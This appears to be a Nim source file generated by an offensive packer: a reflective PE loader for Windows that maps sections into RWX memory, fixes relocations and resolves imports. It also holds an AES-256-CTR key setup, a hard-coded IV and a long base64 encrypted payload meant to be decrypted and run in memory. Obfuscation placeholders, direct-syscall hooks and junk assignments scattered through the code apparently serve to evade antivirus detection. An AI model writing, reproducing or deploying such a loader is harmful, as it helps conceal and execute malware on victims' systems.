var someRandomStuffForReasons = 0 

import winim
import ptr_math
import strutils
import nimcrypto
import base64
import streams
import os

# Obfuscate strings
#@@ObfuscateStrings@@


#@DirectSyscallsDefinitions
# constants
const baseRelocationBlock = 0x8
const baseRelocationEntry = 0x2

# utils
func toByteSeq*(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

# change to use string in memory
proc loadPeToMem*(filePath: string): ptr=
    # read file data
    var rawPeData = readFile(filePath)
    var lpPeBuffer = toByteSeq(rawPeData)
    return lpPeBuffer[0].addr


proc getDosHeader*(lpBuffer: pointer): PIMAGE_DOS_HEADER =
    # error if invalid pointer sent to function
    if lpBuffer == nil:
        return nil 
    return cast[PIMAGE_DOS_HEADER](lpBuffer)

proc getNtHeader*(lpBuffer: pointer): PIMAGE_NT_HEADERS =
    # error if invalid pointer sent to function
    if lpBuffer == nil:
        return nil 
    return cast[PIMAGE_NT_HEADERS](cast[int](lpBuffer) + cast[PIMAGE_DOS_HEADER](lpBuffer).e_lfanew)


proc isPE*(dosHeader: PIMAGE_DOS_HEADER): bool =
    if dosHeader.e_magic == 0x5A4D:
        return true
    return false

proc is64*(ntHeaders: PIMAGE_NT_HEADERS): bool =
    if ntHeaders.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
        return true
    return false

proc isDll*(ntHeaders: PIMAGE_NT_HEADERS): bool =
    if ntHeaders.FileHeader.Characteristics == IMAGE_FILE_DLL:
        return true
    return false

proc isNET*(ntHeaders: PIMAGE_NT_HEADERS): bool =
    if ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size != 0:
        return true
    return false


proc allocateMemory*(ntHeaders: PIMAGE_NT_HEADERS, hProcess: HANDLE): ptr BYTE = 
    someRandomStuffForReasons = 1 + 1

    var pImageBase: ptr BYTE = nil 

    pImageBase = cast[ptr BYTE](VirtualAllocEx(hProcess, cast[LPVOID](ntHeaders.OptionalHeader.ImageBase), ntHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE))
   
    someRandomStuffForReasons = 1 + 1


    return pImageBase

proc mapPeSections*(lpBuffer: pointer, ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE) =
    someRandomStuffForReasons = 1 + 1

    var pImageSectionHeader = IMAGE_FIRST_SECTION(ntHeaders)
    var pImageSectionHeaderArray = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](pImageSectionHeader)
    # iterate through sections
    for i in 0 ..< ntHeaders.FileHeader.NumberOfSections.int:
        var sectionDestination = cast[pointer](cast[int](pImageBase) + pImageSectionHeaderArray[i].VirtualAddress)
        var sectionSource = cast[pointer](cast[int](lpBuffer) + pImageSectionHeaderArray[i].PointerToRawData)
        someRandomStuffForReasons = 1 + 1

        copyMem(
            sectionDestination,
            sectionSource,
            pImageSectionHeaderArray[i].SizeOfRawData
        )

proc getRelocAddr*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): LPVOID=
    return pImageBase + ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress

proc calcRelocDelta*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): ptr BYTE =
    return cast[ptr BYTE](pImageBase) - ntHeaders.OptionalHeader.ImageBase

proc checkPreferedAddress*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): bool =
    someRandomStuffForReasons = 1 + 1

    var preferAddr: LPVOID = cast[LPVOID](ntHeaders.OptionalHeader.ImageBase)
    if preferAddr != pImageBase:
        someRandomStuffForReasons = 1 + 1

        return true
    someRandomStuffForReasons = 1 + 1

    return false

proc baseRelocation*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE, hProcess: HANDLE): bool =
    someRandomStuffForReasons = 1 + 1

    # find relocation table
    var 
        pRelocationTable: LPVOID = getRelocAddr(ntHeaders, pImageBase)
        deltaImageBase = calcRelocDelta(ntHeaders, pImageBase)
        relocationsProcessed = 0
    someRandomStuffForReasons = 1 + 1

    someRandomStuffForReasons = 1 + 1

    var 
        pResult32: uint32 
        pResult16: uint16
        sizeResult32 = cast[SIZE_T](sizeof(pResult32))
        sizeResult16 = cast[SIZE_T](sizeof(pResult16))

    # parse Relocation table
    var relocationTable: LPVOID = pRelocationTable
    someRandomStuffForReasons = 1 + 1

    someRandomStuffForReasons = 1 + 1

    someRandomStuffForReasons = 1 + 1

    while relocationsProcessed < ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size: 
        # read relocation block RVA from proc memory
        ReadProcessMemory(hProcess, pRelocationTable + relocationsProcessed, addr pResult32, sizeResult32, nil)
        var relocationPageAddress = (cast[int](pResult32)) 
        var pageAddress = relocationPageAddress
        # update the relocations processed using the size of the block
        ReadProcessMemory(hProcess, pRelocationTable + relocationsProcessed + 0x4, addr pResult32, sizeResult32, nil)
        relocationsProcessed += baseRelocationBlock
        # get the relocations count for current entry (items in CFF)
        var relocationsCount = int((cast[int](pResult32) - baseRelocationBlock) / baseRelocationEntry)
        someRandomStuffForReasons = 1 + 1

        var i = 0
        relocationsProcessed = relocationsProcessed - baseRelocationEntry
        # Now iterate through all items in current entry
        while i <= relocationsCount:
            # Get relocation value
            relocationsProcessed += baseRelocationEntry
            ReadProcessMemory(hProcess, pRelocationTable + relocationsProcessed, addr pResult16, sizeResult16, nil)
            if toHex(pResult16)[0] == '0':
                relocationsProcessed += baseRelocationEntry
                break
            # Remove type from relocation value
            var relocationEntryOffset = parseHexInt(toHex(pResult16)[1..<4])
            var relocationRVA = pageAddress + cast[int](relocationEntryOffset) 

            var addressToPatch: ptr BYTE = nil
            ReadProcessMemory(hProcess,(pImageBase + relocationRVA), addr addressToPatch, sizeof(DWORD_PTR), nil);
            addressToPatch += cast[ULONGLONG](deltaImageBase)
            copymem((pImageBase + relocationRVA), addr addressToPatch, sizeof(DWORD_PTR));
            inc(i)
    return true

proc resolveThunks(thunk: PIMAGE_THUNK_DATA, pImageBase: ptr BYTE, call_via: csize_t, thunk_addr: csize_t, libraryName: LPSTR) =
    var offsetField: csize_t = 0
    var offsetThunk: csize_t = 0
    var hModule: HMODULE = LoadLibraryA(libraryName)

    while true:
        var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](pImageBase) + offsetField + call_via))
        var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](pImageBase) + offsetThunk + thunk_addr))
        var boolvar: bool
        if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
            boolvar = true
        elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
            boolvar = true

        if (boolvar):
            var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libraryName),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
            fieldThunk.u1.Function = ULONGLONG(libaddr)
            someRandomStuffForReasons = 1 + 1


        if fieldThunk.u1.Function == 0:
            break
        if fieldThunk.u1.Function == orginThunk.u1.Function:
            var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
            var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](pImageBase) + cast[DWORD](nameData))
            var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
            var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule, func_name))     
            someRandomStuffForReasons = 1 + 1

            fieldThunk.u1.Function = ULONGLONG(libaddr)

        inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
        inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))

proc resolveImportAddressTable(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): bool =
    someRandomStuffForReasons = 1 + 1

    # define variables used to parse data
    var importDescriptor: PIMAGE_IMPORT_DESCRIPTOR = nil
    var importDirAddr: csize_t = cast[csize_t](ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
    importDescriptor = cast[PIMAGE_IMPORT_DESCRIPTOR](importDirAddr)
    var libraryName: LPSTR = ""
    var hLibrary: HMODULE
    var importsParsedSize: csize_t = 0
    var importsMaxSize: csize_t = cast[csize_t](ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
    
    # iterate through libraries to import
    while importsParsedSize < importsMaxSize:
        importDescriptor = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
            importDirAddr + importsParsedSize + cast[uint64](pImageBase)))
        
        if (importDescriptor.union1.OriginalFirstThunk == 0) and (importDescriptor.FirstThunk == 0):
            break
        libraryName = cast[LPSTR](cast[ULONGLONG](pImageBase) + importDescriptor.Name)

        hLibrary = LoadLibraryA(libraryName)
        someRandomStuffForReasons = 1 + 1

        if hLibrary != 0:
            # resolve thunks    
            var thunk: PIMAGE_THUNK_DATA = nil
            thunk = cast[PIMAGE_THUNK_DATA](cast[DWORD_PTR](pImageBase) + importDescriptor.FirstThunk)
            var call_via: csize_t = cast[csize_t](importDescriptor.FirstThunk)
            var thunk_addr: csize_t = cast[csize_t](importDescriptor.union1.OriginalFirstThunk)
            if thunk_addr == 0:
                thunk_addr = csize_t(importDescriptor.FirstThunk)

            resolveThunks(thunk, pImageBase, call_via, thunk_addr, libraryName)

        inc(importsParsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
    return true


var ectx: CTR[aes256]
var key: array[aes256.sizeKey, byte]
var iv: array[aes256.sizeBlock, byte] = [28, 172, 206, 214, 58, 184, 162, 25, 189, 222, 7, 107, 31, 175, 126, 113]
var envkey: string = "JCZz[QGdOKqWMIoVGAg^x"
    

var encPayload = "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